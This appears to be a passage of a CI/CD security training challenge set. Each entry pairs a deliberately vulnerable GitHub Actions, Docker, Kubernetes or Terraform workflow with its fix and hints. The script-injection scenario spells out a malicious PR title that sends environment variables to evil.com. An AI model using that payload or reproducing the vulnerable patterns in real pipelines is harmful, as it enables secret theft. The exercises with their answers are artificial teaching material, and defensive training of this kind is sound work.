    "solutionWorkflow": "name: Build and Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n      - name: Install\n        run: npm ci\n\n      - name: Build\n        run: npm run build\n\n      - name: Generate checksums\n        run: sha256sum dist/** > checksums.txt\n\n      - name: Upload artifact\n        uses: actions/upload-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n      - name: Upload checksums\n        uses: actions/upload-artifact@v4\n        with:\n          name: checksums\n          path: checksums.txt\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - name: Download artifact\n        uses: actions/download-artifact@v4\n        with:\n          name: dist\n          path: dist/\n\n      - name: Download checksums\n        uses: actions/download-artifact@v4\n        with:\n          name: checksums\n          path: checksums.txt\n\n      - name: Verify integrity\n        run: sha256sum -c checksums.txt\n\n      - name: Deploy\n        run: |\n          echo \"Deploying artifact...\"\n          echo \"Deploy complete\"\n",
    "hints": [
      "# Hint 1: Generate checksums\n\nAfter building, generate a SHA256 checksum of your artifact: `sha256sum dist/* > checksums.txt`. Upload the checksum file alongside your artifact.\n",
      "# Hint 2: Verify before deploy\n\nIn the deploy job, download both the artifact and checksum file. Verify with: `sha256sum -c checksums.txt`. If verification fails, the deploy should stop.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "script-injection",
    "title": "Script Injection Defense",
    "level": "intermediate",
    "topic": "github-actions",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow is vulnerable to script injection via GitHub context\nvariables. An attacker can craft PR titles or issue bodies that\nexecute arbitrary code. Sanitize all user-controlled inputs.\n",
    "tags": [
      "injection",
      "github-context",
      "script-execution"
    ],
    "prerequisites": [
      "secrets-leak"
    ],
    "objectives": [
      "Explain how expression substitution runs before the shell",
      "Route untrusted context through env indirection",
      "Verify the fix with a simulation run"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Script injection guide"
      }
    ],
    "scenario": "# Scenario: Script Injection\n\nYour workflow uses GitHub context variables directly in `run:` steps. For example, it echoes the PR title or issue body. An attacker can create a PR with a title like:\n\n```\ntitle\"; curl https://evil.com/steal -d \"$(env)\"; echo \"\n```\n\nThis breaks out of the echo command and executes arbitrary code.\n\n**Your mission:** Sanitize all user-controlled inputs before using them in shell commands.\n",
    "vulnerableWorkflow": "name: PR Check\n\non:\n  pull_request:\n    branches: [main]\n\npermissions:\n  contents: read\n  pull-requests: read\n\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Log PR title\n        run: |\n          echo \"Processing PR: ${{ github.event.pull_request.title }}\"\n\n      - name: Check PR description\n        run: |\n          echo \"Description: ${{ github.event.pull_request.body }}\"\n\n      - name: Validate\n        run: |\n          echo \"All checks passed for PR #${{ github.event.pull_request.number }}\"\n",
    "solutionWorkflow": "name: PR Check\r\n\r\non:\r\n  pull_request:\r\n    branches: [main]\r\n\r\npermissions:\r\n  contents: read\r\n  pull-requests: read\r\n\r\njobs:\r\n  check:\r\n    runs-on: ubuntu-latest\r\n    env:\r\n      PR_TITLE: ${{ github.event.pull_request.title }}\r\n      PR_BODY: ${{ github.event.pull_request.body }}\r\n      PR_NUMBER: ${{ github.event.pull_request.number }}\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Log PR title\r\n        run: |\r\n          echo \"Processing PR: $PR_TITLE\"\r\n\r\n      - name: Check PR description\r\n        run: |\r\n          echo \"Description: $PR_BODY\"\r\n\r\n      - name: Validate\r\n        run: |\r\n          echo \"All checks passed for PR #$PR_NUMBER\"\r\n",
    "hints": [
      "# Hint 1: The vulnerability\n\nWhen you write `echo \"${{ github.event.pull_request.title }}\"`, GitHub substitutes the title BEFORE bash sees it. If the title contains shell metacharacters, they execute as code.\n",
      "# Hint 2: Safe alternatives\n\nPass user input as an environment variable instead of interpolating directly:\n```yaml\nenv:\n  PR_TITLE: ${{ github.event.pull_request.title }}\nrun: echo \"$PR_TITLE\"\n```\nEnvironment variables are not subject to shell injection.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "oidc-misconfig",
    "title": "OIDC Trust Done Right",
    "level": "intermediate",
    "topic": "github-actions",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow assumes an AWS role with OIDC but mints no OIDC token, and the\nrole trust policy lets any repository in the org assume it. Wire up OIDC\nproperly and scope the trust to one repository and branch.\n",
    "tags": [
      "oidc",
      "aws",
      "iam",
      "trust-policy"
    ],
    "prerequisites": [
      "secrets-leak",
      "permissions-overkill"
    ],
    "objectives": [
      "Grant id-token write so GitHub mints an OIDC token for the role assumption",
      "Scope the trust policy sub condition to one repository and branch",
      "Verify static keys are gone and untrusted repos cannot assume the role"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "OIDC authentication guide"
      }
    ],
    "scenario": "# Scenario: OIDC Misconfiguration\n\nYour team moved from static AWS credentials to OIDC federation — but the setup\nis wrong in two ways. First, the workflow never grants `id-token: write`, so\nGitHub mints no OIDC token for the role assumption. Second, the role trust\npolicy uses a wildcard subject — `repo:my-org/*` — so ANY repository in your\norganization can assume the deployment role.\n\nA malicious repo in your org can mint a token for your role and access\nproduction AWS resources with a trusted identity.\n\n**Your mission:** Complete the OIDC wiring with `id-token: write`, and scope\nthe trust policy `sub` condition to exactly one repository and branch.\n\n## Key concepts\n- `role-to-assume` needs `permissions: id-token: write` to mint the token\n- The trust policy `sub` decides WHO may assume the role — wildcards delegate it to strangers\n- `StringEquals` with `repo:org/app:ref:refs/heads/main` admits exactly one ref\n",
    "vulnerableWorkflow": "name: Deploy to AWS\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Configure AWS credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy\n          aws-region: us-east-1\n\n      - name: Open trust policy\n        run: |\n          cat > trust-policy.json <<'EOF'\n          {\n            \"Version\": \"2012-10-17\",\n            \"Statement\": [{\n              \"Effect\": \"Allow\",\n              \"Principal\": {\"Federated\": \"arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com\"},\n              \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n              \"Condition\": {\"StringLike\": {\"token.actions.githubusercontent.com:sub\": \"repo:my-org/*\"}}\n            }]\n          }\n          EOF\n          aws iam update-assume-role-policy --role-name github-actions-deploy --policy-document file://trust-policy.json\n\n      - name: Deploy\n        run: |\n          echo \"Deploying to S3...\"\n          echo \"Deploy complete\"\n",
    "solutionWorkflow": "name: Deploy to AWS\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n  id-token: write\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Configure AWS credentials\n        uses: aws-actions/configure-aws-credentials@v4\n        with:\n          role-to-assume: arn:aws:iam::123456789012:role/github-actions-deploy\n          aws-region: us-east-1\n\n      - name: Scope trust policy\n        run: |\n          cat > trust-policy.json <<'EOF'\n          {\n            \"Version\": \"2012-10-17\",\n            \"Statement\": [{\n              \"Effect\": \"Allow\",\n              \"Principal\": {\"Federated\": \"arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com\"},\n              \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n              \"Condition\": {\"StringEquals\": {\"token.actions.githubusercontent.com:sub\": \"repo:my-org/my-app:ref:refs/heads/main\"}}\n            }]\n          }\n          EOF\n          aws iam update-assume-role-policy --role-name github-actions-deploy --policy-document file://trust-policy.json\n\n      - name: Deploy\n        run: |\n          echo \"Deploying to S3...\"\n          echo \"Deploy complete\"\n",
    "hints": [
      "# Hint 1: Two missing pieces\n\nThis workflow fails OIDC twice. First, `configure-aws-credentials` asks for a\nrole but the workflow grants no `id-token: write`, so no OIDC token exists.\nSecond, the trust policy `sub` is `repo:my-org/*` — a wildcard that admits\nevery repository in the org.\n",
      "# Hint 2: The fix\n\nAdd `id-token: write` to permissions, then tighten the trust condition to\n`\"StringEquals\": {\"token.actions.githubusercontent.com:sub\": \"repo:my-org/my-app:ref:refs/heads/main\"}`.\nNo wildcards — exactly one repo and branch may assume the role.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "self-hosted-risk",
    "title": "Self-Hosted Runner Risk",
    "level": "intermediate",
    "topic": "github-actions",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow uses self-hosted runners without container isolation.\nA malicious PR could persist on the runner and compromise future builds.\nSwitch to GitHub-hosted runners or add container isolation.\n",
    "tags": [
      "runners",
      "isolation",
      "supply-chain"
    ],
    "prerequisites": [],
    "objectives": [
      "Explain how persistent runners carry state between jobs",
      "Use ephemeral runners or isolate self-hosted ones"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Runner security guide"
      }
    ],
    "scenario": "# Scenario: Self-Hosted Runner Risk\n\nYour team uses self-hosted runners for faster builds. The problem: a malicious pull request ran code that installed a backdoor on the runner. Now every subsequent build — including builds that handle secrets — runs on a compromised machine.\n\nSelf-hosted runners persist between builds. Unlike GitHub-hosted runners which are fresh VMs every time, a compromised self-hosted runner stays compromised.\n\n**Your mission:** Replace self-hosted runners with GitHub-hosted runners, or add container isolation to limit the blast radius.\n",
    "vulnerableWorkflow": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n  id-token: write\n\njobs:\n  build:\n    runs-on: self-hosted\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n  deploy:\n    runs-on: self-hosted\n    needs: build\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: echo \"Deploying...\"\n",
    "solutionWorkflow": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n  id-token: write\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup\n        run: npm ci\n\n      - name: Test\n        run: npm test\n\n      - name: Build\n        run: npm run build\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy\n        env:\n          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        run: echo \"Deploying...\"\n",
    "hints": [
      "# Hint 1: Why self-hosted is risky\n\nSelf-hosted runners persist between builds. If a malicious step installs a backdoor or modifies the runner, all future builds are compromised. GitHub-hosted runners are ephemeral — destroyed after each job.\n",
      "# Hint 2: The fix\n\nReplace `runs-on: self-hosted` with `runs-on: ubuntu-latest` (or another GitHub-hosted runner). If you must use self-hosted runners, add `container:` to run steps inside an isolated Docker container.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "docker-secrets-in-env",
    "title": "Secrets in Image Layers",
    "level": "intermediate",
    "topic": "docker",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow builds a Docker image with secrets baked into ENV layers.\nAnyone with image pull access can extract the secrets using docker history.\nUse build secrets or runtime environment variables instead.\n",
    "tags": [
      "docker",
      "secrets",
      "image-layers"
    ],
    "prerequisites": [
      "secrets-leak",
      "docker-running-as-root"
    ],
    "objectives": [
      "Keep secrets out of image layers",
      "Use build secrets or runtime environment variables"
    ],
    "references": [
      {
        "page": "docker",
        "label": "Secrets handling guide"
      }
    ],
    "scenario": "# Scenario: Secrets in Image Layers\n\nYour CI pipeline builds Docker images with database credentials passed as build arguments and baked into ENV layers. The image is pushed to a public registry.\n\nAnyone can run `docker history` or inspect image layers to extract the hardcoded passwords. Even if you later remove the ENV instruction, the secret persists in the image layer history.\n\n**Your mission:** Remove secrets from the image build. Use runtime environment variables or Docker build secrets (`--secret`) instead.\n\n## What's at risk?\n- Database credentials exposed to anyone with image pull access\n- Secrets persist in image layer history forever\n- Compliance violations (SOC2, PCI DSS)\n",
    "vulnerableWorkflow": "name: Build Secure App\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          cat <<'EOF' > Dockerfile\n          FROM node:20-slim\n          ENV DB_PASSWORD=supersecret123\n          ENV API_KEY=sk-live-abc123def456\n          WORKDIR /app\n          COPY package*.json ./\n          RUN npm ci --production\n          COPY src/ ./src/\n          CMD [\"node\", \"src/index.js\"]\n          EOF\n          docker build --build-arg AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI -t myapp:latest .\n\n      - name: Push image\n        run: docker push myapp:latest\n",
    "solutionWorkflow": "name: Build Secure App\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          cat <<'EOF' > Dockerfile\n          FROM node:20-slim\n          WORKDIR /app\n          COPY package*.json ./\n          RUN npm ci --production\n          COPY src/ ./src/\n          CMD [\"node\", \"src/index.js\"]\n          EOF\n          docker build -t myapp:latest .\n\n      - name: Push image\n        run: docker push myapp:latest\n",
    "hints": [
      "# Hint 1: How secrets leak in images\n\n`ENV DB_PASSWORD=secret` or `--build-arg DB_PASSWORD=secret` creates a layer that stores the secret. `docker history --no-trunc` reveals it. Even multi-stage builds don't help if the secret is in the final stage's ENV.\n",
      "# Hint 2: The fix\n\nPass secrets at runtime via `docker run -e DB_PASSWORD=$SECRET` or use Docker BuildKit secrets: `RUN --mount=type=secret,id=dbpass cat /run/secrets/dbpass`. Never bake secrets into image layers.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "k8s-no-network-policy",
    "title": "Open Network Chaos",
    "level": "intermediate",
    "topic": "kubernetes",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow deploys multiple microservices without any NetworkPolicy.\nAny pod can communicate with any other pod — including databases, payment\nservices, and admin panels. Add NetworkPolicies to isolate your services.\n",
    "tags": [
      "kubernetes",
      "network-policy",
      "segmentation"
    ],
    "prerequisites": [],
    "objectives": [
      "Deny traffic by default between services",
      "Allow-list only required service paths"
    ],
    "references": [
      {
        "page": "kubernetes",
        "label": "Network segmentation guide"
      }
    ],
    "scenario": "# Scenario: Open Network Chaos\n\nYour cluster runs multiple microservices: a web frontend, an API backend, a database, and a payment service. All deployed without any NetworkPolicy.\n\nBy default, Kubernetes allows all pod-to-pod communication. This means:\n- A compromised frontend pod can directly access the database\n- Any pod can reach the payment service\n- Lateral movement is trivial for attackers\n\n**Your mission:** Add NetworkPolicy resources to restrict traffic flow. The frontend should only reach the API, the API should only reach the database, and the payment service should be isolated.\n\n## Key principle\nZero-trust networking: deny all by default, then allow specific paths.\n",
    "vulnerableWorkflow": "name: Deploy Microservices\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy services\n        run: |\n          cat <<'EOF' > services.yml\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: frontend\n          spec:\n            replicas: 2\n            selector:\n              matchLabels:\n                app: frontend\n            template:\n              metadata:\n                labels:\n                  app: frontend\n              spec:\n                containers:\n                  - name: frontend\n                    image: frontend:latest\n          ---\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: api\n          spec:\n            replicas: 2\n            selector:\n              matchLabels:\n                app: api\n            template:\n              metadata:\n                labels:\n                  app: api\n              spec:\n                containers:\n                  - name: api\n                    image: api:latest\n          ---\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: database\n          spec:\n            replicas: 1\n            selector:\n              matchLabels:\n                app: database\n            template:\n              metadata:\n                labels:\n                  app: database\n              spec:\n                containers:\n                  - name: database\n                    image: postgres:16\n          EOF\n          kubectl apply -f services.yml\n",
    "solutionWorkflow": "name: Deploy Microservices\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy network policies\n        run: |\n          cat <<'EOF' > network-policy.yml\n          apiVersion: networking.k8s.io/v1\n          kind: NetworkPolicy\n          metadata:\n            name: default-deny-ingress\n          spec:\n            podSelector: {}\n            policyTypes:\n              - Ingress\n          ---\n          apiVersion: networking.k8s.io/v1\n          kind: NetworkPolicy\n          metadata:\n            name: allow-frontend-to-api\n          spec:\n            podSelector:\n              matchLabels:\n                app: api\n            ingress:\n              - from:\n                  - podSelector:\n                      matchLabels:\n                        app: frontend\n          ---\n          apiVersion: networking.k8s.io/v1\n          kind: NetworkPolicy\n          metadata:\n            name: allow-api-to-db\n          spec:\n            podSelector:\n              matchLabels:\n                app: database\n            ingress:\n              - from:\n                  - podSelector:\n                      matchLabels:\n                        app: api\n          EOF\n          kubectl apply -f network-policy.yml\n\n      - name: Deploy services\n        run: |\n          cat <<'EOF' > services.yml\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: frontend\n          spec:\n            replicas: 2\n            selector:\n              matchLabels:\n                app: frontend\n            template:\n              metadata:\n                labels:\n                  app: frontend\n              spec:\n                containers:\n                  - name: frontend\n                    image: frontend:latest\n          ---\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: api\n          spec:\n            replicas: 2\n            selector:\n              matchLabels:\n                app: api\n            template:\n              metadata:\n                labels:\n                  app: api\n              spec:\n                containers:\n                  - name: api\n                    image: api:latest\n          ---\n          apiVersion: apps/v1\n          kind: Deployment\n          metadata:\n            name: database\n          spec:\n            replicas: 1\n            selector:\n              matchLabels:\n                app: database\n            template:\n              metadata:\n                labels:\n                  app: database\n              spec:\n                containers:\n                  - name: database\n                    image: postgres:16\n          EOF\n          kubectl apply -f services.yml\n",
    "hints": [
      "# Hint 1: Default behavior\n\nKubernetes has no network isolation by default. All pods can communicate with all other pods across all namespaces. NetworkPolicy is the mechanism to restrict this.\n",
      "# Hint 2: The fix\n\nCreate a NetworkPolicy with `policyTypes: [\"Ingress\"]` and `ingress: []` to deny all ingress by default. Then add specific allow rules for each service's legitimate traffic sources.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "tf-public-s3",
    "title": "Public S3 Bucket",
    "level": "intermediate",
    "topic": "terraform",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow creates an S3 bucket with public read access. Sensitive data\nstored in the bucket is exposed to the entire internet. Use private ACLs\nand enable public access blocks.\n",
    "tags": [
      "terraform",
      "aws",
      "s3",
      "public-access"
    ],
    "prerequisites": [],
    "objectives": [
      "Enforce private ACLs and public access blocks",
      "Enable encryption on stored data"
    ],
    "references": [
      {
        "page": "terraform",
        "label": "Storage hardening guide"
      }
    ],
    "scenario": "# Scenario: Public S3 Bucket\n\nYour Terraform configuration creates an S3 bucket with `acl = \"public-read\"` and `block_public_acls = false`. The bucket is used to store application backups and log files.\n\nAnyone on the internet can list and download the bucket contents. This includes:\n- Application source code\n- Database backups with credentials\n- Log files with user data and PII\n- Internal configuration files\n\nThis is one of the most common AWS misconfigurations and a frequent cause of data breaches.\n\n**Your mission:** Change the ACL to private and enable public access blocks.\n",
    "vulnerableWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Apply\n        run: |\n          cat <<'EOF' > main.tf\n          resource \"aws_s3_bucket\" \"data\" {\n            bucket = \"myapp-backups\"\n          }\n\n          resource \"aws_s3_bucket_acl\" \"data\" {\n            bucket = aws_s3_bucket.data.id\n            acl    = \"public-read\"\n          }\n\n          resource \"aws_s3_bucket_public_access_block\" \"data\" {\n            bucket                  = aws_s3_bucket.data.id\n            block_public_acls       = false\n            block_public_policy     = false\n            ignore_public_acls      = false\n            restrict_public_buckets = false\n          }\n          EOF\n          terraform init\n          terraform apply -auto-approve\n",
    "solutionWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Apply\n        run: |\n          cat <<'EOF' > main.tf\n          resource \"aws_s3_bucket\" \"data\" {\n            bucket = \"myapp-backups\"\n          }\n\n          resource \"aws_s3_bucket_acl\" \"data\" {\n            bucket = aws_s3_bucket.data.id\n            acl    = \"private\"\n          }\n\n          resource \"aws_s3_bucket_public_access_block\" \"data\" {\n            bucket                  = aws_s3_bucket.data.id\n            block_public_acls       = true\n            block_public_policy     = true\n            ignore_public_acls      = true\n            restrict_public_buckets = true\n          }\n          EOF\n          terraform init\n          terraform apply -auto-approve\n",
    "hints": [
      "# Hint 1: Public ACL values\n\n`acl = \"public-read\"` allows anyone on the internet to list and get objects. `block_public_acls = false` disables the safety mechanism that prevents public ACLs. Both must be fixed.\n",
      "# Hint 2: The fix\n\nSet `acl = \"private\"` and enable all four `block_public_*` attributes: `block_public_acls = true`, `block_public_policy = true`, `ignore_public_acls = true`, `restrict_public_buckets = true`.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "mon-silent-failure",
    "title": "Silent Failures",
    "level": "intermediate",
    "topic": "monitoring",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow fails silently — broken steps are hidden with continue-on-error,\nand there are no failure notifications. Bad deploys go unnoticed for hours.\nRemove error suppression and add failure alerts.\n",
    "tags": [
      "monitoring",
      "alerts",
      "error-handling"
    ],
    "prerequisites": [
      "mon-no-build-status",
      "error-swallowing"
    ],
    "objectives": [
      "Remove error suppression from security steps",
      "Add failure alerts that reach a human"
    ],
    "references": [
      {
        "page": "monitoring",
        "label": "Failure alerts guide"
      }
    ],
    "scenario": "# Scenario: Silent Failure\n\nYour deploy pipeline has `continue-on-error: true` on critical steps like testing, security scanning, and deployment verification. The pipeline \"succeeds\" even when tests fail, vulnerabilities are found, or health checks fail.\n\nThe team only discovers issues when users report them — hours or days after deployment. There are no alerts, no notifications, no Slack messages. Failures vanish into the void.\n\n**Your mission:** Remove `continue-on-error: true` from critical steps and add a failure notification step that alerts the team.\n",
    "vulnerableWorkflow": "name: Deploy\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install\n        run: npm ci\n\n      - name: Test\n        run: npm test\n        continue-on-error: true\n\n      - name: Security scan\n        run: npm audit --audit-level=high\n        continue-on-error: true\n\n      - name: Build\n        run: npm run build\n\n      - name: Deploy\n        run: |\n          echo \"Deploying to production...\"\n          echo \"Deploy complete\"\n        continue-on-error: true\n\n      - name: Health check\n        run: |\n          echo \"Checking health endpoint...\"\n          echo \"Health check passed\"\n        continue-on-error: true\n",
    "solutionWorkflow": "name: Deploy\r\n\r\non:\r\n  push:\r\n    branches: [main]\r\n\r\njobs:\r\n  deploy:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Install\r\n        run: npm ci\r\n\r\n      - name: Test\r\n        run: npm test\r\n\r\n      - name: Security scan\r\n        run: npm audit --audit-level=high\r\n\r\n      - name: Build\r\n        run: npm run build\r\n\r\n      - name: Deploy\r\n        run: |\r\n          echo \"Deploying to production...\"\r\n          echo \"Deploy complete\"\r\n\r\n      - name: Health check\r\n        run: |\r\n          echo \"Checking health endpoint...\"\r\n          echo \"Health check passed\"\r\n\r\n      - name: Notify on failure\r\n        if: failure()\r\n        env:\r\n          REPO: ${{ github.repository }}\r\n          SHA: ${{ github.sha }}\r\n          REF: ${{ github.ref_name }}\r\n        run: |\r\n          echo \"DEPLOYMENT FAILED - alerting team\"\r\n          echo \"Repository: $REPO\"\r\n          echo \"Commit: $SHA\"\r\n          echo \"Branch: $REF\"\r\n",
    "hints": [
      "# Hint 1: continue-on-error danger\n\n`continue-on-error: true` makes a failing step report as \"success\" to GitHub. The pipeline continues as if nothing went wrong. Critical failures — test failures, security issues, deployment problems — are silently swallowed.\n",
      "# Hint 2: The fix\n\nRemove `continue-on-error: true` from all critical steps. Add a notification step with `if: failure()` that sends alerts via Slack webhook, email, or GitHub Issues. The `always()` condition ensures notifications run even when previous steps fail.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "cache-poisoning",
    "title": "Poisoned Cache, Trusted Release",
    "level": "intermediate",
    "topic": "github-actions",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This release workflow restores a shared dependency cache before publishing to npm.\nA poisoned cache entry written by an untrusted run ships straight into the release.\nRemove caching from the release job and build dependencies fresh.\n",
    "tags": [
      "cache",
      "supply-chain",
      "release"
    ],
    "prerequisites": [
      "unsafe-deps",
      "artifact-tampering"
    ],
    "objectives": [
      "Explain how shared caches let untrusted runs poison release builds",
      "Remove cache restore and save steps from the release job",
      "Verify the release installs dependencies fresh with no cache restore"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Cache isolation and poisoning guide"
      }
    ],
    "scenario": "# Scenario: Poisoned Cache, Trusted Release\r\n\r\nYour release workflow publishes to npm on every GitHub release. To speed it up,\r\nsomeone added `actions/cache` to restore `~/.npm` before `npm ci`.\r\n\r\nThe problem: caches are **shared across runs**. An untrusted run (a fork PR, a\r\ncompromised dependency job) can write a poisoned entry under the same key. Your\r\nrelease job then restores attacker-controlled bytes and publishes them with\r\nproduction credentials attached.\r\n\r\nThis is not theoretical. In May 2026 attackers chained a `pull_request_target`\r\nmisconfiguration with cache poisoning across the fork-to-base trust boundary to\r\npublish malicious packages under a trusted identity (CVE-2026-45321).\r\n\r\n**Your mission:** Remove caching from the release job so every release installs\r\ndependencies fresh.\r\n\r\n## Key concepts\r\n- Cache entries are shared state, not trusted input\r\n- Release and publish jobs must not restore caches written by less-trusted runs\r\n- `npm ci` on a lockfile is reproducible without a cache\r\n",
    "vulnerableWorkflow": "name: Release\r\n\r\non:\r\n  release:\r\n    types: [published]\r\n\r\npermissions:\r\n  contents: read\r\n  id-token: write\r\n\r\njobs:\r\n  release:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Restore dependencies\r\n        uses: actions/cache@v4\r\n        with:\r\n          path: ~/.npm\r\n          key: npm-deps-${{ hashFiles('package-lock.json') }}\r\n\r\n      - name: Install dependencies\r\n        run: npm ci\r\n\r\n      - name: Build\r\n        run: npm run build\r\n\r\n      - name: Publish to npm\r\n        run: npm publish --access public\r\n        env:\r\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\r\n",
    "solutionWorkflow": "name: Release\r\n\r\non:\r\n  release:\r\n    types: [published]\r\n\r\npermissions:\r\n  contents: read\r\n  id-token: write\r\n\r\njobs:\r\n  release:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Install dependencies\r\n        run: npm ci\r\n\r\n      - name: Build\r\n        run: npm run build\r\n\r\n      - name: Publish to npm\r\n        run: npm publish --access public\r\n        env:\r\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\r\n",
    "hints": [
      "# Hint 1: Where the trust boundary breaks\r\n\r\nThe `actions/cache` step restores `~/.npm` using a key any run can compute:\r\n`npm-deps-${{ hashFiles('package-lock.json') }}`. Any workflow run in this\r\nrepository that saves under that key — including low-privilege ones — feeds\r\nbytes straight into your release build.\r\n",
      "# Hint 2: The fix\r\n\r\nDelete the entire `actions/cache` step from the release job. Keep `npm ci` —\r\nwith a committed lockfile it is deterministic without a cache. As a rule:\r\nrelease and publish jobs restore no caches, ever.\r\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "ungated-prod",
    "title": "Ungated Prod",
    "level": "intermediate",
    "topic": "github-actions",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow deploys to production on every push to main with no\nenvironment gate. No required reviewers, no wait timer, no branch policy —\nany merged commit reaches production unreviewed. Gate the deploy job.\n",
    "tags": [
      "deployments",
      "environments",
      "gating"
    ],
    "prerequisites": [
      "permissions-overkill"
    ],
    "objectives": [
      "Explain why production deploys need an environment gate with required reviewers",
      "Add environment production to the prod deploy job",
      "Verify unreviewed pushes can no longer reach production ungated"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Environment protection guide"
      }
    ],
    "scenario": "# Scenario: Ungated Prod\r\n\r\nYour pipeline builds on every push to `main` and then deploys straight to\r\nproduction. There is no `environment:` on the deploy job, which means none of\r\nGitHub's deployment protections apply: no required reviewers, no wait timer,\r\nno branch policy, and production secrets are available to every run\r\nimmediately.\r\n\r\nAny commit that lands on `main` — including a compromised dependency update or\r\na mistaken merge — reaches production with zero human oversight.\r\n\r\n**Your mission:** Gate the production deploy job behind the `production`\r\nenvironment (required reviewers and branch policy are configured there in\r\nrepository Settings).\r\n\r\n## Key concepts\r\n- `environment: production` pauses the job until protection rules pass\r\n- Rules live in Settings, the workflow only names the environment\r\n- A missing environment name silently creates an unprotected one — use the exact name\r\n",
